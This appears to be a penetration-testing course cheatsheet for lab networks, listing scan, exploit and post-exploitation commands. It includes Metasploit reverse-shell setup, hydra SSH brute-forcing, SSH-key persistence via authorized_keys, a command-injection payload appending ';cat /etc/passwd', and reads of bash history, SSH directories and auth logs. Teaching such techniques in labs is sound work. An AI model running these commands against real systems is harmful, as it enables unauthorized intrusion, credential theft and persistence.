# PB177 Cheatsheet

## [Labs](./labs/README.md)

## Useful websites
- vulnerability search
	- https://www.google.com/
	- https://nvd.nist.gov/vuln/search
- hash type identifier
	- https://hashes.com/en/tools/hash_identifier

## Strategy & Commands

- [Scanning network](#scanning-network)
- [Searching vulnerabilities](#searching-vulnerabilities)
- [Exploiting vulnerability](#exploiting-vulnerability)
- [Password guessing](#password-guessing)
- [Password cracking](#password-cracking)
- [Command injection](#command-injection)
- [Lateral movement](#lateral-movement)
- [What to always check](#what-to-always-check)

### Scanning network

1. scan network for hosts
```sh
nmap -T5 10.0.33.0/24
```

2. scan host for open ports, application versions, operating system, vulnerabilities
```sh
nmap -T5 -p- -sS -sV -O -Pn 10.0.33.50
```

3. scan port for vulnerabilities (extremely slow - can skip)
```sh
nmap -p 443 --script=vuln -Pn 10.0.66.201
```

4. resolve hostnames
```sh
host 10.0.33.50
```

5. get info about company from certificates
```sh
nmap --script ssl-cert 10.0.66.201 
```

6. scan publicly accessible directories at web servers
```sh
dirb https://10.0.66.201

nmap --script=http-enum 10.0.66.201
```

7. check if host is online
```
ping -c 1 10.0.0.254 && echo "Host is ONLINE" || echo "Host is OFFLINE"
```

### Searching vulnerabilities

1. run linpeas
```sh
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
podman cp linpeas.sh attacker:~/linpeas.sh
```

2. search anything sus with google

### Exploiting vulnerability

1. search metasploit for exploit
```sh
search webmin
info 0
```

2. test out exploit
```sh
use 0
set RHOST 10.0.33.80
set LHOST eth0 # for reverse shell
set RPORT 10000
show options
check
```

### Password guessing

1. create a wordlist with AI (should be a small file)
```sh
# might need to convert to ascii
cat wordlist.txt | iconv -f utf-8 -t ascii//TRANSLIT > output.txt
file output.txt
```

2. run hydra (should give result right away !!!)
```sh
hydra -l username -P wordlist.txt ssh://10.0.88.2
```

3. connect through ssh and add ssh pub key
```sh
ssh test@10.0.33.110
mkdir -p ~/.ssh
ssh-keygen -t ed25519 -C "email@example.com"
scp .ssh/id_ed25519.pub test@10.0.33.110:~/.ssh/authorized_keys
```

### Password cracking

1. save hash in file

2. get hash type from google search

3. crack with john
```sh
john --format=Raw-MD5 passwords.txt
```

### Command injection

1. find out the request format

2. forge command injection
```sh
curl -s http://10.0.0.10:80/vulnerabilities/exec/ -X POST --data-raw 'ip=10.0.0.254;cat /etc/passwd&Submit=Submit' | lynx -nolist -dump -stdin
```

### Lateral movement

1. check for more hosts on the system

2. connect to them

3. collect info as you go

### What to always check

- run Linpeas

- DNS configuration
```sh
cat /etc/resolv.conf
```

- message of the day
```sh
cat /run/motd.dynamic
cat /var/run/motd.dynamic
```

- bash history
```sh
cat ~/.bash_history
```

- ssh directory
```
ls ~/.ssh
```

- other users
```sh
cat /etc/passwd
```

- files
```sh
find / -name "*.docx"
```

- logs
```sh
cat /var/log/auth.log
cat /var/log/syslog
```
